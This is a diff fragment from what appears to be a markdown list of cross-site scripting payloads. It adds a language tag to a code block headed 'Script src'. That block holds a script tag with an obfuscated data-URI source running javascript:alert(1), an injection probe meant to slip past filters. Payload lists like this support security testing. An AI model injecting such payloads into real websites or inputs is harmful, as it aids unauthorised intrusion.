@@ -19,7 +19,7 @@
 ```
 
 ### Script src
-```
+```html
 <script src="data:\xD4\x8F,javascript:alert(1)">
 ```
 
